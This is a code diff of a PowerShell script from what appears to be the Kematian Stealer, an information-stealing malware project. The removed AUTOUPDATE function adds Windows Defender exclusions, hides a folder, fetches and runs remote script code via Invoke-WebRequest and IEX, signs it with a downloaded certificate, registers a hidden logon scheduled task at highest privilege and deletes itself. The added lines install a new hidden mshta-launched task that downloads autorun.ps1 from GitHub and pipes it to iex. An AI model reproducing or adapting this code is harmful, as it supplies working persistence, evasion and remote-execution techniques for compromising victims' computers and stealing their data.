@@ -34,49 +34,6 @@ function KDMUTEX {
 }
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
-function AUTOUPDATE {
-    if ($autoupdate) { 
-        New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
-        Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
-        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
-        $Content = @"
-`$t=(Iwr -Uri "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1" -useb);`$t-replace "YOUR_WEBHOOK_HERE", "AUTOUPDATE WEBHOOK" | IEX
-"@
-        [IO.File]::WriteAllText("$env:APPDATA\Kematian\Kematian.ps1", $Content)
-        $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
-        $KDOT_DIR.attributes = "Hidden", "System"
-        $url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
-        $outputPath = "$env:tmp\Kematian.pfx"
-        if (Test-Path $outputPath) { Remove-Item $outputPath -Force }
-        Invoke-WebRequest -Uri $url -OutFile $outputPath 
-        $certificatePath = $outputPath
-        $certificatePassword = ConvertTo-SecureString -String "Kematian" -AsPlainText -Force
-        $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificatePath, $certificatePassword)
-        Set-AuthenticodeSignature -FilePath "$env:APPDATA\Kematian\Kematian.ps1" -Certificate $certificate -TimestampServer "http://timestamp.comodoca.com"
-        Remove-Item "$env:tmp\Kematian.pfx" -Force	
-        $task_name = "Kematian"
-        if ($debug) {
-            $task_action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "-ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1"
-        }
-        else {
-            $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
-        }
-        $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-        $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
-        Start-ScheduledTask -TaskName "Kematian"
-        if ($melt) { 
-            try {
-                Remove-Item $pscommandpath -force
-            }
-            catch {}
-        }
-    }
-    else {
-        KDMUTEX
-    }
-}
-
 #THIS CODE WAS MADE BY EvilByteCode
 Add-Type -TypeDefinition @"
 using System;
@@ -1156,7 +1113,8 @@ function Invoke-TASKS {
         $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
         $KDOT_DIR.attributes = "Hidden", "System"
         $task_name = "Kematian"
-        $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -C ''iwr -Uri https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1 -OutFile %appdata%\Kematian\Kematian.ps1 ; powershell.exe -exec bypass -NoProfile -NonInteractive -F %appdata%\Kematian\Kematian.ps1''",0)(window.close)'
+        $command = "PowerShell.exe -ExecutionPolicy Bypass -C '`$webhook = $webhook ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex'"
+        $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run("$command",0)(window.close)"
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
         Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
@@ -1170,13 +1128,9 @@ function Invoke-TASKS {
 }
 
 if (CHECK_AND_PATCH -eq $true) {
-    if ($debug -eq $true) {
-        AUTOUPDATE
-    }
-    else {
-        AUTOUPDATE
-    }    
+    KDMUTEX
     if ($debug) {
+        Read-Host -Prompt "Press Enter to continue"
         exit
     }
     else {
